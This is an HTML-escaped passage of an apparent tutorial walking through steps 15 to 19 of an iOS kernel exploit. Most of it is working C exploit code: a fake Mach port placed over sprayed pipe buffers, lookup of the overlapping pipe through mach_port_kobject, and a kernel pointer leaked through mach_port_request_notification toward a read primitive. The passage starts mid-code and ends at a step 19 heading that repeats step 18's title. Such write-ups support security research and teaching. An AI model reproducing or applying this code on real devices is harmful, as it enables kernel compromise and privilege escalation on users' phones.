    				&lt;span class=&quot;n&quot;&gt;ool_ports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;voucher_start&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_PORT_NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    				&lt;span class=&quot;n&quot;&gt;INFO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;received fake port 0x%x&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fake_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    			&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    		&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
    	&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// Make sure we got a fake port.&lt;/span&gt;
    	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MACH_PORT_VALID&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fake_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fake_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_PORT_NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    			&lt;span class=&quot;n&quot;&gt;ERROR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;did not receive a fake port in OOL ports spray&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    			&lt;span class=&quot;n&quot;&gt;ERROR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;received an invalid fake port in OOL ports spray&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    		&lt;span class=&quot;n&quot;&gt;fail&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h4 id=&quot;step-15-find-overlapping-pipefds&quot;&gt;Step 15: Find overlapping pipefds&lt;/h4&gt;

&lt;p&gt;Next, we need to identify that out of the all the pipe buffers that we created, which one overlaps with the fake port. To do that, we use the API &lt;strong&gt;mach_port_kobject&lt;/strong&gt; to get the &lt;strong&gt;IKOT_TYPE&lt;/strong&gt; value of the &lt;strong&gt;fake_port&lt;/strong&gt; and this value should be the index of the pipe, because if you remember, in Step 4, we were creating ports within the pipe buffers and for each port that we created, we were overalapping the &lt;strong&gt;IKOT_TYPE&lt;/strong&gt; with the index of the pipe buffer. Using this, we can identify which &lt;strong&gt;pipefds&lt;/strong&gt; our fake port is overlapping with.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;c1&quot;&gt;// 15\. Check which pair of pipefds overlaps our port using mach_port_kobject(). The&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// returned type value will be the lower 12 bits of the ipc_port's ip_bits field, which&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// we've set to the index of the pipe overlapping the port during our spray.&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;//&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// This is the third and final risky part: we could panic if our fake port doesn't actually&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// point into our pipe buffers. After this, though, it's all smooth sailing.&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;natural_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;mach_vm_address_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;kr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mach_port_kobject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_task_self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fake_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KERN_SUCCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    		&lt;span class=&quot;n&quot;&gt;ERROR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s returned %d: %s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;mach_port_kobject&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mach_error_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    		&lt;span class=&quot;n&quot;&gt;ERROR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;could not determine the pipe index of our port&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    	&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pipe_index&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;INFO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;port is at pipe index %zu&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pipe_index&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// Get the pipefds that allow us to control the port.&lt;/span&gt;
    	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port_pipefds&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pipefds_array&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pipe_index&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;pipefds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port_pipefds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;pipefds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port_pipefds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;port_pipefds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;port_pipefds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h4 id=&quot;step-16-clean-up-the-unused-memory&quot;&gt;Step 16: Clean up the unused memory&lt;/h4&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;c1&quot;&gt;// 16\. Clean up unneeded resources: terminate the ith_voucher thread, discard the filler&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// ports, and close the sprayed pipes.&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;thread_terminate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;thread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;destroy_ports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filler_ports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;filler_port_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filler_ports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;close_pipes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pipefds_array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pipe_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pipefds_array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h4 id=&quot;step-17-set-up-primitive-to-find-the-address-of-the-base-port&quot;&gt;Step 17: Set up primitive to find the address of the base port&lt;/h4&gt;

&lt;p&gt;We have a fake port overlapping with the content of the pipe buffer, that we can read and write into since we know which pipe buffer is it. Now our task is to create a &lt;strong&gt;fake port&lt;/strong&gt; such that we can use the &lt;strong&gt;pid_for_task()&lt;/strong&gt; technique with it to read 4 bytes of kernel memory at a time. This technique was discussed in the Part 1 of this article.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/pid.png&quot; alt=&quot;Pid&quot; /&gt;&lt;/p&gt;

&lt;p&gt;But what this also means is that our fake task’s &lt;strong&gt;kobject&lt;/strong&gt; field should point to a task struct that we control, so that we can have a look at the &lt;strong&gt;bsd_info&lt;/strong&gt; field of the task that points to a &lt;strong&gt;proc&lt;/strong&gt; struct. Ideally, the fake port along with the fake task should both be in the pipe buffers, so we can read and write into them. In order to find that out, we send the mach api call &lt;strong&gt;mach_port_request_notification()&lt;/strong&gt; to the fake port to add a request that if the fake port becomes a dead name (&lt;strong&gt;MACH_PORT_DEAD&lt;/strong&gt;), the base port will be notified. This causes our fake port’s &lt;strong&gt;ip_requests&lt;/strong&gt; field to point to an array that contains a pointer to the &lt;strong&gt;base_port&lt;/strong&gt; address.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;c1&quot;&gt;// 17\. Use mach_port_request_notification() to put a pointer to an array containing&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// base_port in our port's ip_requests field.&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;mach_port_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;prev_notify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;kr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mach_port_request_notification&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_task_self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fake_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    			&lt;span class=&quot;n&quot;&gt;MACH_NOTIFY_DEAD_NAME&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    			&lt;span class=&quot;n&quot;&gt;base_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_MSG_TYPE_MAKE_SEND_ONCE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    			&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prev_notify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KERN_SUCCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    		&lt;span class=&quot;n&quot;&gt;ERROR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s returned %d: %s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;mach_port_request_notification&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    				&lt;span class=&quot;n&quot;&gt;kr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mach_error_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    		&lt;span class=&quot;n&quot;&gt;ERROR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;could not request a notification for the fake port&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    		&lt;span class=&quot;n&quot;&gt;fail&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;assert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prev_notify&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_PORT_NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h4 id=&quot;step-18-find-the-address-of-the-base-port&quot;&gt;Step 18: Find the address of the base port&lt;/h4&gt;

&lt;p&gt;We read from the overlapping pipe buffer and iterate though the whole buffer as ports, look at each possible port’s &lt;strong&gt;ip_requests&lt;/strong&gt; field, and if we find that field, we know that it contains the address of an array that contains a pointer to &lt;strong&gt;base_port&lt;/strong&gt;, because this is the only port we have set a notification for. Note that we still can’t read that address yet. We save the offset of that fake port within the pipe buffer. Then we write to the pipe so the data from the pipe can now be read later on. We now know exactly at what offset the fake port lies in the pipe buffer and within which pipe buffer it lies (we already found that out before). We also know the address of &lt;strong&gt;ip_requests&lt;/strong&gt; so we need a way to read from that address.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;c1&quot;&gt;// 18\. Now read back our pipe buffer to discover the value of ip_requests (and get our&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// first kernel pointer!). This also tells us where our port is located inside the pipe&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// buffer.&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;read_pipe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;__block&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip_requests&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;iterate_ipc_ports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pipe_buffer_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port_offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    		&lt;span class=&quot;kt&quot;&gt;uint8_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint8_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pipe_buffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port_offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    		&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port_ip_requests&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OFFSET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip_requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port_ip_requests&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    			&lt;span class=&quot;c1&quot;&gt;// We've found the overlapping port. Record the offset of the fake port,&lt;/span&gt;
    			&lt;span class=&quot;c1&quot;&gt;// save the ip_requests array, and set the field in the port to NULL.&lt;/span&gt;
    			&lt;span class=&quot;n&quot;&gt;assert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip_requests&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    			&lt;span class=&quot;n&quot;&gt;fake_port_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port_offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    			&lt;span class=&quot;n&quot;&gt;ip_requests&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port_ip_requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    			&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port_ip_requests&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    			&lt;span class=&quot;c1&quot;&gt;// Clear out all the other fake ports.&lt;/span&gt;
    			&lt;span class=&quot;n&quot;&gt;memset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SIZE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    	&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// Make sure we found it.&lt;/span&gt;
    	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip_requests&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    		&lt;span class=&quot;n&quot;&gt;ERROR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;could not find %s in pipe buffers&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;ip_requests&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    		&lt;span class=&quot;n&quot;&gt;fail&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;INFO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;got %s at 0x%016llx&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;ip_requests&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip_requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;INFO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;fake port is at offset %zu&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fake_port_offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// Do a write so that the stage0 and stage1 read primitives can start with a pipe read.&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;write_pipe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h4 id=&quot;step-19-find-the-address-of-the-base-port&quot;&gt;Step 19: Find the address of the base port&lt;/h4&gt;

